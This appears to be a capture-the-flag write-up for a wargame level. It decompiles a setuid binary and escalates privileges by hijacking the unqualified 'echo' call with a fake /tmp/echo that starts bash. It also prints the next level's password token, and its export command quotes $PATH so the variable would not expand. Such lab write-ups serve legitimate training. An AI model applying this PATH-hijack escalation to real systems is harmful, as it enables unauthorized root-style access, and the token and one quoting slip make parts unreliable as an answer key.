## LEVEL03  
  
### file level03  
`level03` is an executable file compiled from level03.c, in ELF32 format.  
  
### Ghidra  
With a decompiler (Ghidra), we can recover the source code:  
  
`int main(int argc, char **argv, char **envp) {`  
`  __gid_t __rgid;`  
`  __uid_t __ruid;`  
`  int iVar1;`  
`  gid_t gid;`  
`  uid_t uid;`  
`  `  
`  __rgid = getegid();`  
`  __ruid = geteuid();`  
`  setresgid(__rgid, __rgid, __rgid);`  
`  setresuid(__ruid, __ruid, __ruid);`  
`  iVar1 = system("/usr/bin/env echo Exploit me");`  
`  return iVar1;`  
`}`  
  
or  
  
### strings command  
`strings level03`: returns the static strings in the program  
`getegid`, `geteuid`, `setresgid`, `setresuid`, `system`.  
  
`system()` can be exploited. The command `env` is safe because it is directly called by its path, but `echo` uses the `$PATH` environment variable, which can be manipulated.  
  
### RUID / SUID  
  
ruid: The Real User ID designates the user who launched the process.  
suid: The Saved User ID is essential for a process with elevated privileges, allowing it to temporarily switch privileges for certain tasks.  
  
`ls -la level03` outputs `rwsr-sr-x`  
`s`: SUID, meaning the script is executed with the privileges of another UID. It is executed with the UID privileges of the user `flag03`.  
  
### /tmp + $PATH  
  
* Create a fake `echo` command with:  
`echo "/bin/bash" > /tmp/echo`  
Don’t forget to add execution permissions:  
`chmod +x echo`  
  
* Add the path to the `$PATH` environment variable:  
`export PATH='/tmp:$PATH'`  
  
* Execute `./level03`  
`echo` = `/bin/bash` runs with the UID privileges of the user `flag03`, opening a bash environment where we are the user `flag03`.  
`id` = `flag03`  
`getflag` returns the connection token for the user `level04`.  
  
flag03: no flag, privilege escalation. User `level03` becomes user `flag03`, then `getflag` is used.  
  
token_passwd_level04: `qi0maab88jeaj46qoumi7maus`  